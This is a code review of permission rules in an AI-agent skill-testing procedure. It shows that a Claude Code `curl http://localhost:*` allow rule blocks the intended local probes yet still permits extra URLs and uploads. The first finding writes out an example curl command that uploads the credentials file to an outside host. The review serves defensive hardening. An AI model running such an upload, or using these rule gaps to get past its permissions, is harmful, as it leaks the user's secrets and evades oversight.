## Verdict: REQUEST CHANGES

The `context/AGENTS.md` clause is sound: it matches preflight's list, the behavioural evidence (3 of 3 stop-and-ask against a 3 of 3 control) supports it, and the size test passes. The matrix procedure is the problem. The Claude rule `Bash(curl http://localhost:*)` is valid syntax, but it is the legacy `:*` prefix form, so its prefix is `curl http://localhost` and it matches only when a space or the end of the command follows. It therefore allows none of the port-qualified requests it was written for (`curl http://localhost:8080/...`), while still allowing `curl http://localhost <any URL> -T <file>`. Separately, the `bash` and `python` rows tell the agent to run `bash -n` and `python3 -m py_compile`, and both commands were removed from both lists. On Antigravity those rows are auto-denied, and under the procedure's own rule such a run does not count. The procedure's fix path (add the denied command by name) then brings back the grant the same line says was removed for security. The Claude list change was never run, even though BUG-087/090/091 (now in `AGENTS.md` § Testing) say a sandbox setup must prove itself before its output counts.

## Findings

- **[medium / confidence: high]** `.agents/docs/testing/skill-matrix.md:13`: `"Bash(curl http://localhost:*)"` and `"Bash(curl http://127.0.0.1:*)"` do not match the commands they are meant to allow.
  - **How Claude Code parses it.** Claude Code 2.1.283 parses a rule ending in `:*` with `^(.+):\*$` into `{type:"prefix", prefix:"curl http://localhost"}`. It matches with `cmd === prefix || cmd.startsWith(prefix + " ")` (read from the bundled parser, functions `Fye`/`Kmn`/`_Le`).
  - **What that means.** `curl http://localhost:8080/healthz` does not match, because the character after the prefix is `:`, not a space. `curl -s http://localhost:8080/...` does not match either. The rule allows only port 80 and forms like `curl http://localhost https://elsewhere -T <home>/.claude/.credentials.json`, because curl takes several URLs and a `-T`/`-d @file` upload.
  - **Effect.** The rule neither permits the local probes nor stops the exfiltration shape it names.
  - **Fix.** Pick one:
    - Drop curl from the Claude list. No scenario prompt requires running curl: the `bash` row only writes it into a script.
    - Or use the wildcard form `Bash(curl http://localhost:8080/*)` and record that it is a convenience, not a boundary. Any trailing `*` still admits extra URLs and upload flags.
  - **Verification.** Verify by a run whose transcript shows the curl call allowed.
- **[medium / confidence: high]** `.agents/docs/testing/skill-matrix.md:45-46` against `:13-14`: the `bash` row ("Run bash -n on it") and the `python` row ("Run python3 -m py_compile on it") need commands that both lists no longer grant.
